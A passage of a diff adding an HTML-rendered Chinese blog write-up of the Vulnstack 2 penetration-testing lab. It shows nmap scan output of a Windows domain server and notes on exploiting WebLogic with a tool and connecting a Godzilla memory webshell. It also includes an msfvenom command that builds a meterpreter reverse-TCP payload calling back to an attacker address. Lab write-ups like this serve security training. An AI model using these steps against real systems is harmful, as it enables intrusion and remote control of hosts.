+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49153&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49154&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49155&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49160&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;MAC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;D1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VMware&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OSs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2012&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cpe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;discovery&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;OS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Standard&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7601&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Pack&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Standard&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;OS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cpe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows_server_2008&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Computer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;NetBIOS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;computer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;x00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Forest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;FQDN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;08&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_clock&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;skew&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h08m33s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;deviation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h01m23s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;median&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;start_date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;06&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Message&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;signing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enabled&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;but&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;required&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;account_used&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;guest&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;authentication_level&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;challenge_response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;supported&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;message_signing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disabled&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dangerous&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;but&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;渗透&#34;&gt;渗透
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;80端口&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;没看到啥东西&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;7001端口&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726385172384-cc672406-0fc5-425e-a306-10ce6d63f6aa.png&#34;
+	width=&#34;1272&#34;
+	height=&#34;389&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726385172384-cc672406-0fc5-425e-a306-10ce6d63f6aa_hu63bec0c042a5adcf66c064141b6473f2_57994_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726385172384-cc672406-0fc5-425e-a306-10ce6d63f6aa_hu63bec0c042a5adcf66c064141b6473f2_57994_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;326&#34;
+		data-flex-basis=&#34;784px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;扫目录&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726385809527-1cdb4ab4-2c86-49ee-91e1-66aa93db14ee.png&#34;
+	width=&#34;604&#34;
+	height=&#34;294&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726385809527-1cdb4ab4-2c86-49ee-91e1-66aa93db14ee_hucf0f32523f3392bf06bbf72cf4cf524e_59045_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726385809527-1cdb4ab4-2c86-49ee-91e1-66aa93db14ee_hucf0f32523f3392bf06bbf72cf4cf524e_59045_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;205&#34;
+		data-flex-basis=&#34;493px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能看到网站的版本&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386230259-58374838-9af3-43d4-bc62-0d94957e932e.png&#34;
+	width=&#34;988&#34;
+	height=&#34;297&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386230259-58374838-9af3-43d4-bc62-0d94957e932e_hucd22dbfb0cf94a87ce1010e9549e6d52_71885_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386230259-58374838-9af3-43d4-bc62-0d94957e932e_hucd22dbfb0cf94a87ce1010e9549e6d52_71885_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;332&#34;
+		data-flex-basis=&#34;798px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用weblogic漏洞工具&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386250612-f597cc24-d52d-4224-8521-aef6efef1a61.png&#34;
+	width=&#34;903&#34;
+	height=&#34;273&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386250612-f597cc24-d52d-4224-8521-aef6efef1a61_hucc16104b5c089e121bf2ec4f489fc61f_41541_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386250612-f597cc24-d52d-4224-8521-aef6efef1a61_hucc16104b5c089e121bf2ec4f489fc61f_41541_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;330&#34;
+		data-flex-basis=&#34;793px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用哥斯拉连内存马&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386261853-3331f547-029a-4933-b555-451c30a3e115.png&#34;
+	width=&#34;917&#34;
+	height=&#34;247&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386261853-3331f547-029a-4933-b555-451c30a3e115_hue0e9c0f1b0e25afaeda6da1db8bb98dd_48674_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726386261853-3331f547-029a-4933-b555-451c30a3e115_hue0e9c0f1b0e25afaeda6da1db8bb98dd_48674_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;371&#34;
+		data-flex-basis=&#34;891px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功连上&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726392347864-69eaab46-176e-400f-8cf4-a19cb7254e99.png&#34;
+	width=&#34;768&#34;
+	height=&#34;693&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726392347864-69eaab46-176e-400f-8cf4-a19cb7254e99_hu7153f35ac6f803fbde1400b504925618_28141_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726392347864-69eaab46-176e-400f-8cf4-a19cb7254e99_hu7153f35ac6f803fbde1400b504925618_28141_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;110&#34;
+		data-flex-basis=&#34;265px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ipconfig /all&lt;/code&gt;能看到两个网卡&lt;/p&gt;
+&lt;p&gt;一个&lt;code&gt;10.10.10.80&lt;/code&gt;一个&lt;code&gt;192.168.254.130&lt;/code&gt;,域是&lt;code&gt;de1ay.com&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;域子ip是&lt;code&gt;10.10.10.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;域控一般都是&lt;code&gt;10.10.10.10&lt;/code&gt;也就是DNS服务器&lt;/p&gt;
+&lt;h3 id=&#34;msf&#34;&gt;msf
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;wmic os get osarchitecture &lt;/code&gt;是x64架构&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.254.128 lport=1234 -f exe -o run.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;生成payload&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391515970-d57fb184-40ce-4bfb-aa60-1f005ecf2696.png&#34;
+	width=&#34;528&#34;
+	height=&#34;126&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391515970-d57fb184-40ce-4bfb-aa60-1f005ecf2696_hue3bcf2df0b99aa46cd02e8d165686e2b_31159_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391515970-d57fb184-40ce-4bfb-aa60-1f005ecf2696_hue3bcf2df0b99aa46cd02e8d165686e2b_31159_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;419&#34;
+		data-flex-basis=&#34;1005px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391493332-ec3beaae-6f09-47a9-8dbe-56f2290ec696.png&#34;
+	width=&#34;496&#34;
+	height=&#34;298&#34;
